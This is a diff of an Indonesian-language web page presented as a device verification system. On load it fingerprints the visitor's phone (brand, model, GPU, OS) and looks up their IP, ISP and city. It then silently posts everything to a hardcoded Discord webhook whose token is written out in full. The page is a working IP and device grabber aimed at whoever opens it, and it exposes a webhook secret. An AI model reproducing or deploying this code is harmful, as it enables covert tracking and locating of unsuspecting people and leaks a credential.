@@ -3,96 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Info Perangkat</title>
+    <title>Sistem Verifikasi Perangkat</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; line-height: 1.6; }
-        .container { max-width: 500px; margin: auto; background: #1e293b; padding: 20px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        h2 { border-bottom: 2px solid #38bdf8; padding-bottom: 10px; color: #38bdf8; }
-        .info-item { background: #334155; margin: 10px 0; padding: 10px; border-radius: 6px; font-size: 14px; }
-        .label { font-weight: bold; color: #94a3b8; display: block; font-size: 12px; }
-        .status { text-align: center; padding: 10px; margin-top: 15px; border-radius: 6px; font-weight: bold; }
-        .success { background: #065f46; color: #34d399; }
-        .error { background: #7f1d1d; color: #f87171; }
-        .warning { font-size: 11px; color: #facc15; margin-top: 10px; text-align: center; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 100%; max-width: 450px; text-align: center; border: 1px solid #334155; }
+        .brand-header { font-size: 28px; font-weight: bold; color: #38bdf8; margin-bottom: 5px; }
+        .model-name { font-size: 18px; color: #94a3b8; margin-bottom: 20px; }
+        .info-grid { text-align: left; background: #0f172a; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .item { margin-bottom: 10px; border-bottom: 1px solid #1e293b; padding-bottom: 5px; font-size: 13px; }
+        .label { color: #64748b; font-size: 11px; text-transform: uppercase; display: block; }
+        .value { color: #f1f5f9; font-weight: 500; }
+        .loader { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 10px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Informasi Perangkat</h2>
-    <div id="display">Menganalisis...</div>
-    <div id="status-box"></div>
-    <p class="warning">*IMEI tidak dapat diakses browser demi keamanan privasi global.</p>
+<div class="card" id="main-card">
+    <div id="loading-area">
+        <div class="loader"></div>
+        <p>Menganalisis Spesifikasi Perangkat...</p>
+    </div>
+    
+    <div id="result-area" style="display: none;">
+        <div class="brand-header" id="ui-brand">Mendeteksi...</div>
+        <div class="model-name" id="ui-model">Mencari Model...</div>
+        
+        <div class="info-grid">
+            <div class="item"><span class="label">Alamat IP & ISP</span><span class="value" id="ui-ip">Memuat...</span></div>
+            <div class="item"><span class="label">Lokasi Estimasi</span><span class="value" id="ui-loc">Memuat...</span></div>
+            <div class="item"><span class="label">Chipset (GPU)</span><span class="value" id="ui-gpu">Memuat...</span></div>
+            <div class="item"><span class="label">Versi OS</span><span class="value" id="ui-os">Memuat...</span></div>
+        </div>
+        <p style="font-size: 11px; color: #64748b;">Data telah disinkronkan ke server.</p>
+    </div>
 </div>
 
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";
 
-    async function init() {
-        const statusBox = document.getElementById('status-box');
-        const display = document.getElementById('display');
-
-        // Ambil data baterai
-        let bat = "Tidak didukung";
-        try {
-            const b = await navigator.getBattery();
-            bat = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Mengisi Daya' : 'Tidak Dicash'})`;
-        } catch(e) {}
-
-        const deviceData = {
+    async function analyzeDevice() {
+        let info = {
+            brand: "Unknown",
+            model: "Model Tersembunyi",
             os: navigator.platform,
-            browser: navigator.userAgent,
-            screen: `${screen.width}x${screen.height}`,
-            lang: navigator.language,
-            time: new Date().toLocaleString('id-ID'),
-            battery: bat
+            gpu: "Unknown",
+            ip: "Checking...",
+            isp: "Checking...",
+            loc: "Checking..."
         };
 
-        // Tampilkan di layar website
-        display.innerHTML = `
-            <div class="info-item"><span class="label">MODEL / BROWSER</span>${deviceData.browser}</div>
-            <div class="info-item"><span class="label">SISTEM OPERASI</span>${deviceData.os}</div>
-            <div class="info-item"><span class="label">RESOLUSI LAYAR</span>${deviceData.screen}</div>
-            <div class="info-item"><span class="label">STATUS BATERAI</span>${deviceData.battery}</div>
-            <div class="info-item"><span class="label">WAKTU AKSES</span>${deviceData.time}</div>
-        `;
+        // 1. Deteksi GPU (Untuk menebak chipset/HP)
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "Generic GPU";
 
-        // Kirim ke Webhook
+        // 2. Deteksi Merk & Model (Cara Modern - Client Hints)
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            try {
+                const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'fullVersionList']);
+                if (hints.model) info.model = hints.model;
+                
+                // Tebak Brand dari Model Code
+                const ua = navigator.userAgent.toLowerCase();
+                if (ua.includes("samsung") || info.model.includes("SM-")) info.brand = "Samsung";
+                else if (ua.includes("xiaomi") || ua.includes("redmi")) info.brand = "Xiaomi";
+                else if (ua.includes("oppo")) info.brand = "OPPO";
+                else if (ua.includes("vivo")) info.brand = "Vivo";
+                else if (ua.includes("iphone")) info.brand = "Apple";
+                else info.brand = "Android Device";
+            } catch (e) {}
+        } else {
+            // Cara Lama (Parsing User Agent)
+            const ua = navigator.userAgent;
+            if (/iphone|ipad|ipod/i.test(ua)) info.brand = "Apple (iPhone)";
+            else if (/samsung/i.test(ua)) info.brand = "Samsung";
+            else info.brand = "Android Perangkat";
+        }
+
+        // 3. Ambil IP, ISP, dan Lokasi
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            info.ip = data.ip;
+            info.isp = data.org;
+            info.loc = `${data.city}, ${data.region}`;
+        } catch (e) { info.ip = "Gagal memuat info jaringan"; }
+
+        // Update Tampilan UI
+        document.getElementById('loading-area').style.display = 'none';
+        document.getElementById('result-area').style.display = 'block';
+        document.getElementById('ui-brand').innerText = info.brand;
+        document.getElementById('ui-model').innerText = info.model;
+        document.getElementById('ui-ip').innerText = `${info.ip} (${info.isp})`;
+        document.getElementById('ui-loc').innerText = info.loc;
+        document.getElementById('ui-gpu').innerText = info.gpu;
+        document.getElementById('ui-os').innerText = navigator.userAgent.split(')')[0].split('(')[1];
+
+        // Kirim ke Discord
+        sendToDiscord(info);
+    }
+
+    async function sendToDiscord(d) {
         const payload = {
-            username: "Device Logger Bot",
+            username: "HP DETECTOR SYSTEM",
             embeds: [{
-                title: "📱 Data Perangkat Masuk",
-                color: 5763719,
+                title: "📱 PERANGKAT BERHASIL DIIDENTIFIKASI",
+                color: 3066993,
                 fields: [
-                    { name: "User Agent", value: deviceData.browser },
-                    { name: "OS/Platform", value: deviceData.os, inline: true },
-                    { name: "Baterai", value: deviceData.battery, inline: true },
-                    { name: "Layar", value: deviceData.screen, inline: true }
+                    { name: "Merk", value: `**${d.brand}**`, inline: true },
+                    { name: "Model/Code", value: `\`${d.model}\``, inline: true },
+                    { name: "Jaringan (ISP)", value: d.isp, inline: false },
+                    { name: "Alamat IP", value: d.ip, inline: true },
+                    { name: "Kota/Lokasi", value: d.loc, inline: true },
+                    { name: "GPU/Chipset", value: d.gpu, inline: false },
+                    { name: "User Agent", value: `\`${navigator.userAgent}\`` }
                 ],
                 timestamp: new Date()
             }]
         };
 
-        try {
-            const response = await fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            if (response.ok) {
-                statusBox.className = "status success";
-                statusBox.innerText = "✓ Data Terkirim ke Webhook";
-            } else {
-                throw new Error();
-            }
-        } catch (err) {
-            statusBox.className = "status error";
-            statusBox.innerText = "✗ Gagal Mengirim ke Webhook";
-        }
+        await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
     }
 
-    window.onload = init;
+    window.onload = analyzeDevice;
 </script>
 
 </body>
